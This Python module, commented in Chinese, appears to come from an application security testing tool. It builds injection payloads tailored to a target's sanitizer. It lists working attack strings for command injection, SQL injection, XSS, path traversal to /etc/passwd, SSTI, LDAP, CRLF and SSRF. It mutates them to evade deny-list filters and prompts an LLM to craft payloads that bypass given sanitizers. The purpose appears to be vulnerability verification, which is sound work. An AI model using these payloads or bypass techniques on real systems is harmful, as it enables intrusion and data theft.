"""净化感知造弹（2026-10-02 落地，造弹路线重写第二步）。

与旧路线的本质区别：
- 旧：按族写死一张静态表（command_execution 只有 ";id"），再配一个固定顺序的变体梯子
  （baseline → url_encode → alt_syntax → oob）。它不知道对手在拦什么，只是"多试几种写法"。
- 新：先有 FilterSpec（净化器到底拒绝什么 / 允许什么），再**在约束内构造**候选，
  并且**发出前用 simulate_filter 确定性验一遍**，凡必被拦的直接丢弃。

LLM 的位置也变了：不是让它凭空发明 payload，而是把 FilterSpec 一起塞进提示词，
让它在已知约束内补充候选（产出可校验）。

两种合成模式：
  A 字符串/守卫绕过（注入族主流）——本项目源码推导出的 FilterSpec 驱动。
  B 反序列化/fastjson —— 守卫在库内部（checkAutoType 拒绝名单，常为哈希），项目源码读不到，
    走「SCA 锁定版本 → 已知拒绝集 → 拒绝名单感知的 gadget 选择」，由 OOB/执行确认。
    该模式在 sca_forge_attack_payloads 已有基础上工作，此处只提供约束记录位。
"""
from __future__ import annotations

import re
from typing import Any, Callable, Dict, List, Optional

from src.core.sanitizer_miner import FilterSpec, simulate_filter, simulate_filter_safe

# 确定性候选池：比旧的单一静态表丰富得多，覆盖常见的"绕过写法空间"。
# 构造原则：同一个语义，准备多种表达形态，由 FilterSpec 决定哪些能活下来。
FAMILY_CANDIDATES: Dict[str, List[str]] = {
    "command_execution": [
        ";id", "|id", "&id", "&&id", "||id",
        "%0aid", "%0aid%0a", "$(id)", "`id`",
        "${IFS}id", "id${IFS}", "$'\\x20'id",
        ";sleep 1", "|sleep 1", "%0asleep 1", "$(sleep 1)",
    ],
    "sqli": [
        "' OR '1'='1", "'||'1'='1", "' OR 1=1-- ", "' OR '1'='1'-- ",
        "' ;WAITFOR DELAY '0:0:1'--", "%27%20OR%20%271%27%3D%271",
        "'/**/OR/**/'1'='1", "') OR ('1'='1", "' OR 1=1#",
    ],
    "xss": [
        "<script>alert(1)</script>", "<ScRiPt>alert(1)</ScRiPt>",
        "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>",
        "<body onload=alert(1)>", "<iframe src=javascript:alert(1)>",
        "%3Cscript%3Ealert(1)%3C/script%3E", "<scr<script>ipt>alert(1)</script>",
    ],
    "path_traversal": [
        "../etc/passwd", "..%2fetc%2fpasswd", "..%252fetc%252fpasswd",
        "....//etc/passwd", "..\\/etc/passwd", "%2e%2e%2fetc%2fpasswd",
        "../../../../etc/passwd", "..;/etc/passwd",
    ],
    "ssti": ["${7*7}", "#{7*7}", "{{7*7}}", "<%= 7*7 %>", "${7*'7'}"],
    "ldap_injection": ["*)(uid=*", "*)(|(uid=*", "admin*", "*", "*)(&(uid=*"],
    "xpathi": ["' or '1'='1", "' or '1'='1' or '", "'] | //user[", "1=1]*)"],
    "crlf_injection": ["%0d%0aX-SastAI-Injected: 1", "\r\nX-SastAI-Injected: 1",
                       "%0aX-SastAI-Injected: 1", "%E5%98%8D%0D%0AX-SastAI: 1"],
    "ssrf": ["http://127.0.0.1:8080/", "http://localhost:8080/", "http://[::1]:8080/",
             "http://2130706433/", "http://0x7f000001/"],
}

_LLM_PROMPT = """你是应用安全专家。下面是目标代码里的一个净化/校验函数，以及从它抽出的约束。
请只输出 JSON 数组（不要解释），给出 3-8 个**满足该约束**、且仍能触发该类漏洞的攻击载荷字符串。

漏洞族: {family}
目标 sink: {sink}
净化器类型: {kind}
必须避开的片段(拒绝 token): {tokens}
必须落在其中的正则(允许字符集): {patterns}
已应用的变换: {transforms}
是否先解码再检查: {decode_first}

净化器源码:
```java
{body}
```

只输出 JSON 数组，例如: ["payload1", "payload2"]
"""


def _norm_family(family: str) -> str:
    return str(family or "").strip().lower().replace("-", "_")


def llm_propose(spec: Optional[FilterSpec], family: str, sink: str, body: str,
                llm_complete: Optional[Callable[[str], str]]) -> List[str]:
    """在已知约束内让 LLM 补充候选。提示词带约束，不让它猜。"""
    if llm_complete is None:
        return []
    s = spec or FilterSpec()
    try:
        import json as _json
        prompt = _LLM_PROMPT.format(
            family=family, sink=sink or "-", kind=s.kind,
            tokens=s.tokens or "[]", patterns=s.patterns or "[]",
            transforms=s.transforms or "[]", decode_first=s.decode_first,
            body=(body or "")[:2500],
        )
        raw = llm_complete(prompt) or ""
        m = re.search(r"\[[\s\S]*\]", raw)
        if not m:
            return []
        arr = _json.loads(m.group(0))
        return [str(x) for x in arr if isinstance(x, str) and x.strip()]
    except Exception:
        return []


def _spec_driven_candidates(spec: Optional[FilterSpec], family: str) -> List[str]:
    """Q3：规格驱动生成器（主干）。不再只靠写死的静态种子，而是按 FilterSpec 构造候选：

    - ALLOW（白名单）：用允许集字符拼出短串，探测「白名单是否过宽」（能否整串落入允许集内）；
    - DENY（黑名单）：对族利用串做「避开 deny token」的变异（大小写 / URL 编码 / 注释分割 /
      同义构造），凡能避开拒绝 token 的变体即可能绕过；
    - 静态种子保留为 bootstrap 兜底，但规格驱动变体优先，解决「静态池不感知 filter_spec 导致闭环空转」。
    """
    fam = _norm_family(family)
    out: List[str] = []
    base = list(FAMILY_CANDIDATES.get(fam, []))

    if spec is not None and spec.is_known():
        if spec.kind == FilterSpec.KIND_ALLOW and spec.patterns:
            # 解析允许集字符，拼几发短串探测白名单过宽
            try:
                from src.core.filter_verdict import parse_allowed_chars
                allowed = parse_allowed_chars(spec.patterns[0]) or set()
            except Exception:
                allowed = set()
            if allowed:
                ordered = "".join(sorted(allowed))
                probes = [ordered[:6], ordered[:3] + "x", "a" + ordered[:2] + "b"]
                out.extend(p for p in probes if p)
        elif spec.kind == FilterSpec.KIND_DENY and spec.tokens:
            import urllib.parse as _up
            for e in base:
                out.append(e)
                # 大小写变异（针对大小写敏感 deny：过滤器按字面匹配，改大小写即可绕过）
                if spec.case_sensitive:
                    out.append(e.swapcase())
                # URL 编码变异（避开字面 deny token）
                try:
                    out.append(_up.quote(e))
                except Exception:
                    pass
                # 注释/空白分割（SQL 类：在 token 间插 /**/ 或内联空格）
                if fam in ("sqli", "command_execution"):
                    for tok in spec.tokens:
                        if tok and tok in e:
                            out.append(e.replace(tok, "/" + "*" + "/" + tok, 1))
    else:
        out.extend(base)
    # 去重保序
    seen = set()
    uniq: List[str] = []
    for p in out:
        if p and p not in seen:
            seen.add(p)
            uniq.append(p)
    return uniq


def synthesize(spec: Optional[FilterSpec], family: str, sink: str = "",
               body: str = "", llm_complete: Optional[Callable[[str], str]] = None,
               extra_bases: Optional[List[str]] = None, max_out: int = 6) -> Dict[str, Any]:
    """在约束内合成候选，并用 simulate_filter 做确定性闸门。

    返回 {candidates, rejected, spec, source}。rejected 记录被闸门判死的载荷，
    供重放记忆（第 3 条）累积「试过什么、为什么被拒」。
    """
    fam = _norm_family(family)
    pool: List[str] = []
    pool.extend(FAMILY_CANDIDATES.get(fam, []))
    # Q3：规格驱动生成器优先注入（按 FilterSpec 构造/变异候选）
    pool.extend(_spec_driven_candidates(spec, family))
    for b in (extra_bases or []):
        if b and b not in pool:
            pool.append(b)
    source = "deterministic" if pool else "none"

    llm_out = llm_propose(spec, family, sink, body, llm_complete)
    if llm_out:
        pool.extend([p for p in llm_out if p not in pool])
        source = "llm" if source == "none" else "mixed"

    candidates: List[str] = []
    rejected: List[str] = []
    for p in pool:
        if not p:
            continue
        # Q4：用三态 simulate_filter_safe 做确定性闸门。True=放行 / False=必拦 / None=正则不支持。
        # None（占有量词/原子组/Unicode 属性/灾难性回溯等 Python 近似不可信）一律 fail-open：
        # 不丢弃载荷、交运行时裁决，绝不把「判不出」当「可放行」乱发，也绝不静默丢有效弹。
        _res = simulate_filter_safe(spec, p)
        if _res is False:
            rejected.append(p)
        else:
            candidates.append(p)
        if len(candidates) >= max_out:
            break
    return {
        "candidates": candidates,
        "rejected": rejected,
        "spec": spec.to_dict() if spec is not None else None,
        "source": source,
    }


def gate(candidates: List[str], family: str, spec: Optional[FilterSpec]) -> List[str]:
    """发出前的最后一道：族形状自检 + 净化器模拟，双闸门。"""
    if not candidates:
        return []
    try:
        from src.iast.attack_context import filter_payloads_by_family
        shaped, _rej = filter_payloads_by_family(list(candidates), family)
    except Exception:
        shaped = list(candidates)
    return [p for p in shaped if simulate_filter_safe(spec, p) is not False]
